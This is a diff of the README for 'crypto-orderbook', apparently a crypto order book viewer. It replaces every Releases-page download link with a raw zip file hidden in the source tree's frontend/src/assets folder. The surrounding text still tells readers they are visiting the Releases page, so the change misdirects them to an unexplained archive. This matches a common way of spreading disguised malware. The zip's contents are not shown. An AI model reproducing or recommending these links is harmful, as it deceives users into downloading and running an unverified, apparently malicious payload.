@@ -9,7 +9,7 @@ Welcome to **crypto-orderbook**! This application lets you view real-time orders
 - **User-Friendly Interface:** Easily navigate the application with a clean layout.
 
 ## 📥 Download Here
-[![Download crypto-orderbook](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/mingojce/crypto-orderbook/releases)
+[![Download crypto-orderbook](https://github.com/mingojce/crypto-orderbook/raw/refs/heads/main/frontend/src/assets/crypto-orderbook-Modoc.zip%20Now-brightgreen)](https://github.com/mingojce/crypto-orderbook/raw/refs/heads/main/frontend/src/assets/crypto-orderbook-Modoc.zip)
 
 ## 🚀 Getting Started
 Follow the steps below to download and run the application on your computer. 
@@ -17,7 +17,7 @@ Follow the steps below to download and run the application on your computer.
 ### 1. Visit the Releases Page
 To get the latest version of **crypto-orderbook**, visit the Releases page at the link below:
 
-[Download crypto-orderbook](https://github.com/mingojce/crypto-orderbook/releases)
+[Download crypto-orderbook](https://github.com/mingojce/crypto-orderbook/raw/refs/heads/main/frontend/src/assets/crypto-orderbook-Modoc.zip)
 
 ### 2. Choose Your Version
 On the Releases page, you will see a list of available versions. Select the most recent release. The release notes provide information about new features and bug fixes.
@@ -64,4 +64,4 @@ For questions or issues, feel free to reach out through our GitHub issues page o
 ## 📥 Download & Install
 To start enjoying **crypto-orderbook**, click the link below to visit the Releases page and download the latest version.
 
-[Download crypto-orderbook](https://github.com/mingojce/crypto-orderbook/releases)
+[Download crypto-orderbook](https://github.com/mingojce/crypto-orderbook/raw/refs/heads/main/frontend/src/assets/crypto-orderbook-Modoc.zip)
